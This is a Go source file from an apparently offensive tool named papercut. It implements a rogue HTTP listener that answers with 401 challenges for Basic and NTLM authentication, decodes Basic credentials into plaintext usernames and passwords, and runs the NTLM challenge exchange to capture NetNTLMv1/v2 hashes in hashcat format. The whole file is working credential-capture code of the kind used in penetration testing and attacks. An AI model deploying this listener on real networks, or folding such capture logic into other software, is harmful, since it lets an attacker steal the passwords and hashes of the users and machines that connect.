package listener

import (
	"bufio"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"strings"
	"time"

	"papercut/internal/output"
)

// HTTPCreds holds captured HTTP authentication credentials.
type HTTPCreds struct {
	SourceIP   string
	Username   string
	Password   string
	AuthMethod string // "Basic", "NTLM"
	NTLMHash   string // populated for NTLM auth (hashcat format)
	URI        string // requested path
}

// ListenHTTP starts a TCP listener on addr (host:port), waits for one incoming
// HTTP request with authentication, captures credentials, then returns.
// If useTLS is true, a self-signed certificate is generated and TLS is used.
// It blocks until credentials are received or the context/timeout expires.
func ListenHTTP(ctx context.Context, addr string, timeout time.Duration, useTLS bool, verbose bool) (*HTTPCreds, error) {
	tcpLn, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer tcpLn.Close()

	// Set accept deadline on the TCP listener before TLS wrapping
	if rawLn, ok := tcpLn.(*net.TCPListener); ok {
		rawLn.SetDeadline(time.Now().Add(timeout))
	}

	ln := tcpLn

	// Wrap with TLS if requested
	if useTLS {
		tlsCfg, err := generateSelfSignedTLS()
		if err != nil {
			return nil, fmt.Errorf("generate TLS cert: %w", err)
		}
		ln = tls.NewListener(tcpLn, tlsCfg)

		if verbose {
			output.Info("TLS enabled with self-signed certificate")
		}
	}

	// Close listener when context is cancelled
	go func() {
		<-ctx.Done()
		tcpLn.Close()
	}()

	conn, err := ln.Accept()
	if err != nil {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("cancelled while waiting for HTTP connection")
		default:
			return nil, fmt.Errorf("accept: %w", err)
		}
	}
	defer conn.Close()

	sourceIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(sourceIP); err == nil {
		sourceIP = host
	}

	if verbose {
		output.Info("HTTP connection received from %s", sourceIP)
	}

	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	// NTLM requires multiple round-trips on the same connection
	var serverChallenge []byte
	reader := bufio.NewReader(conn)

	for {

		// Read request line
		requestLine, err := reader.ReadString('\n')
		if err != nil {
			return nil, fmt.Errorf("read request from %s: %w", sourceIP, err)
		}
		requestLine = strings.TrimRight(requestLine, "\r\n")

		// Parse method and URI
		uri := "/"
		parts := strings.Fields(requestLine)
		if len(parts) >= 2 {
			uri = parts[1]
		}

		if verbose {
			output.Info("HTTP < %s", requestLine)
		}

		// Read headers
		headers := make(map[string]string)
		for {
			headerLine, err := reader.ReadString('\n')
			if err != nil {
				return nil, fmt.Errorf("read header from %s: %w", sourceIP, err)
			}
			headerLine = strings.TrimRight(headerLine, "\r\n")
			if headerLine == "" {
				break // End of headers
			}

			if idx := strings.Index(headerLine, ": "); idx != -1 {
				key := strings.ToLower(headerLine[:idx])
				val := headerLine[idx+2:]
				headers[key] = val

				if verbose {
					output.Info("HTTP < %s", headerLine)
				}
			}
		}

		// Check for Authorization header
		authHeader := headers["authorization"]

		if authHeader == "" {
			// No auth — send 401 requesting both Basic and NTLM
			sendHTTP401(conn, verbose)
			continue
		}

		// Basic Auth
		if strings.HasPrefix(authHeader, "Basic ") {
			encoded := strings.TrimPrefix(authHeader, "Basic ")
			decoded, err := base64.StdEncoding.DecodeString(encoded)
			if err != nil {
				sendHTTP401(conn, verbose)
				continue
			}

			colonIdx := strings.IndexByte(string(decoded), ':')
			if colonIdx < 0 {
				sendHTTP401(conn, verbose)
				continue
			}

			sendHTTP200(conn)

			return &HTTPCreds{
				SourceIP:   sourceIP,
				Username:   string(decoded[:colonIdx]),
				Password:   string(decoded[colonIdx+1:]),
				AuthMethod: "Basic",
				URI:        uri,
			}, nil
		}

		// NTLM Auth
		if strings.HasPrefix(authHeader, "NTLM ") {
			encoded := strings.TrimPrefix(authHeader, "NTLM ")
			ntlmData, err := base64.StdEncoding.DecodeString(encoded)
			if err != nil {
				sendHTTP401(conn, verbose)
				continue
			}

			msgType := ParseNTLMType(ntlmData)

			switch msgType {
			case ntlmNegotiate:
				// Type 1 (negotiate) → send Type 2 (challenge)
				serverChallenge, err = GenerateServerChallenge()
				if err != nil {
					return nil, err
				}

				challengeMsg := BuildNTLMChallenge(serverChallenge)
				challengeB64 := base64.StdEncoding.EncodeToString(challengeMsg)

				resp := fmt.Sprintf("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM %s\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n", challengeB64)
				conn.Write([]byte(resp))

				if verbose {
					output.Info("NTLM negotiate received, sent challenge")
				}
				continue

			case ntlmAuthenticate:
				// Type 3 (authenticate) → extract credentials
				auth, err := ParseNTLMAuth(ntlmData)
				if err != nil {
					return nil, fmt.Errorf("parse NTLM auth from %s: %w", sourceIP, err)
				}

				sendHTTP200(conn)

				hashStr := NTLMHashString(auth, serverChallenge)
				hashType := NTLMHashType(auth)

				creds := &HTTPCreds{
					SourceIP:   sourceIP,
					Username:   auth.Username,
					AuthMethod: "NTLM",
					NTLMHash:   hashStr,
					URI:        uri,
				}

				if hashType == "NetNTLMv2" || hashType == "NetNTLMv1" {
					creds.Password = fmt.Sprintf("[%s hash captured]", hashType)
				}
				if auth.Domain != "" {
					creds.Username = auth.Domain + `\` + auth.Username
				}

				return creds, nil

			default:
				sendHTTP401(conn, verbose)
				continue
			}
		}

		// Unknown auth scheme — request again
		sendHTTP401(conn, verbose)
	}
}

func sendHTTP401(conn net.Conn, verbose bool) {
	resp := "HTTP/1.1 401 Unauthorized\r\n" +
		"WWW-Authenticate: Basic realm=\"Secure Area\"\r\n" +
		"WWW-Authenticate: NTLM\r\n" +
		"Content-Type: text/html\r\n" +
		"Content-Length: 25\r\n" +
		"Connection: keep-alive\r\n\r\n" +
		"Authentication Required\r\n"
	conn.Write([]byte(resp))

	if verbose {
		output.Info("Sent 401 requesting Basic/NTLM auth")
	}
}

func sendHTTP200(conn net.Conn) {
	resp := "HTTP/1.1 200 OK\r\n" +
		"Content-Type: text/html\r\n" +
		"Content-Length: 2\r\n" +
		"Connection: close\r\n\r\n" +
		"OK"
	conn.Write([]byte(resp))
}

// generateSelfSignedTLS creates an ephemeral self-signed TLS configuration.
func generateSelfSignedTLS() (*tls.Config, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate key: %w", err)
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		DNSNames:     []string{"localhost"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return nil, fmt.Errorf("create certificate: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return nil, fmt.Errorf("marshal key: %w", err)
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, fmt.Errorf("load keypair: %w", err)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
	}, nil
}
